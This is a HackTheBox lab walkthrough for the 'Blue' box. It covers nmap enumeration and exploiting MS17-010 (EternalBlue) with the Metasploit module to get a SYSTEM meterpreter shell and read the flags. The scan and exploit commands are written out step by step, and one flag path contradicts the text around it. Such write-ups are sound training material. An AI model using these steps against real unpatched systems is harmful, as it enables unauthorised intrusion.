# HackTheBox Writeup: Blue
![Blue Details](/Blue/images/Blue-Details.png)

Blue is an easy Windows-based retired box available on HackTheBox. It is also one of the OSCP-like boxes available to practice on. In this walkthrough, I will guide you through the process compromising Blue.

## System Setup and Initial Steps
I’ll be using a somewhat customized version of Kali Linux running in a virtual machine for this guide. These steps are reproducible in a default installation of Kali Linux, but you may have to install some additional tools.

I like to make a dedicated folder for each box to keep track of any scan results or exploits we need to work with. I normally use the convention of saving them to a folder such as `~/HackTheBox/[boxname]`.

Before beginning, you have to connect to HackTheBox using the VPN connection package they provide you with when you register an account. I use small script I wrote to do so quickly (which I will make available on my github). I have the script aliased to ‘hackthebox-connect’. The script also outputs your IP address on the HackTheBox network, which will be useful when we start attacking the box.

![hackthebox-connect](/Blue/images/hackthebox-connect.PNG)

## Initial Enumeration
Blue is located at 10.10.10.40. The first step is to scan the system using a scanner such as `nmap`.

### Nmap Scanning
I like to run nmap in two different sets of scans. The first scan is a quick scan to get us started on the box. The second scan is a more intensive scan that will check every port.
To run a relatively fast scan that will check each service, attempt to discover the operating system of the target system, and run a few additional nmap scripting engine scripts, you can use the following command:
```
nmap -sV -sC -O 10.10.10.40 -oN Blue-quick.nmap
```
The above command will save its output in a file called `Blue-quick.nmap`, which you can check the contents of using `cat` or `less`. This scan shows us the following:

![Quick Nmap Scan](/Blue/images/Blue-Quick-Nmap.PNG)

I also find it helpful to do a more fulsome nmap scan. This normally takes a while, so I leave it running in the background while I get started with the quick scan. I normally run something similar to:
```
nmap -p- -sV -sC -O -A -v -T4 --script vuln 10.10.10.40 -oN Blue-full.nmap
```
The key component to this scan is that it checks all TCP ports with `-p-` and it runs the "vuln" category of nmap scripting engine scripts, which will scan the target for vulnerabilities. Here, the output of this command includes the following:

![Full Nmap Scan](/Blue/images/Blue-Full-Nmap.PNG)

### Other Initial Enumeration Techniques
`nmap` is a tool that is generally available by default in the default depositories of most Linux distributions, so it is generally preferable to use it and be familiar with it since you will likely always have access to it.

For HackTheBox and other CTF challenges, you can take a look at some tools that are designed to make the process go faster. For example, [AutoRecon](https://github.com/Tib3rius/AutoRecon) can quickly launch a number of scans against a target system. It saves the output of each scan in a dedicated file, making it easy to go back and review.

### Thinking About The Enumeration Results
Based on our nmap scanning, we know that the target is a Windows machine. Our fulsome nmap scan is also reporting that the box is running a vulnerable version of [SMB](https://www.wikiwand.com/en/Server_Message_Block).

Although there are a number of ports open here and many potential paths forward, our fulsome nmap scan has presented us with a path of least resistance.

If we search the internet for `smb-vuln-ms17-010` and `CVE-2017-0143`, it doesn't take long to find that CVE-2017-0143 is related to a family of [other vulnerabilities](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) which allow for remote code execution. Some further digging will reveal the namesake of the box: the exploit for this family of vulnerabilities is called [EternalBlue](https://www.wikiwand.com/en/EternalBlue). We can thank the NSA for developing the exploit and making our path forward clear.

## Exploitation: Exploiting the SMB Vulnerability
Since EternalBlue is a relatively (in)famous exploit, there is a metasploit module for it. We can start metasploit with `msfconsole`.

![Msfconsole](/Blue/images/msfconsole.PNG)

Then, we can run a search for available modules by running:
```
search eternalblue
```
or
```
search ms17-010
```
or
```
search 2017-0143
```
![Search for modules](/Blue/images/metasploit-search.PNG)

Now we have a list of available modules. Modules #2-5 are exploits, so we want to focus here. Module 5 on first glance appears to be the best, with a rank of 'Great' and the ability to check if the target is vulnerable, but Blue is not actually vulnerable to the doublepulsar exploit. The next best one is #2, which provides us with the ability to check to see if the exploit works. You will now want to select that module with the following command:
```
use exploit/windows/smb/ms17_010_eternalblue
```
Now that we have the module selected, we need to customize the options to make sure it works in this specific circumstance. Check the available options by running `options`. You then need to configure them with the following commands:
```
set RHOSTS [the target's IP address. In this case, 10.10.10.40]
set LHOST [Your HackTheBox IP address (outputted by hackthebox-connect). Using tun0 here also works.]
```
![Setting the options](/Blue/images/metasploit-set-options.PNG)

Now you can check to see if the target is vulnerable by running `check`.

![Check](/Blue/images/metasploit-check.PNG)

Now initiate the exploit with `run` and you should be dropped into a meterpreter shell.
![Exploit](/Blue/images/metasploit-exploit.PNG)

We can check what our username is by using the mterpreter command `getuid`, which shows that we are NT AUTHORITY\SYSTEM.
![Getuid](/Blue/images/metasploit-getuid.PNG)

## Post-Exploitation
### Getting the User Flag
We can get a shell on the system by running the meterpreter command `shell`. Once we have a shell, we can poke around the system. First, we can check who the users are by running:
```
dir C:\Users
```
![Users Directory](/Blue/images/dir-users.PNG)

And now we can check through haris' home folder. On the Desktop, you will find a file called `user.txt`, which we can read with the command `type C:\Users\haris\Desktop\user.txt`.

![User Flag](/Blue/images/Enumerate-Haris-Home.PNG)

Now we have the user flag!

### Getting the Root Flag
We know that we are NT AUTHORITY\SYSTEM, so we should be able to access the files in the "Administrator" user folder. Looking through the Administrator's files using `dir`, we find the file `root.txt` on the Desktop, which we can read with the command `type C:\Users\haris\Administrator\root.txt`.

![Root Flag](/Blue/images/Enumerate-Administrator-Home.PNG)

You now have the root flag and have completed Blue!
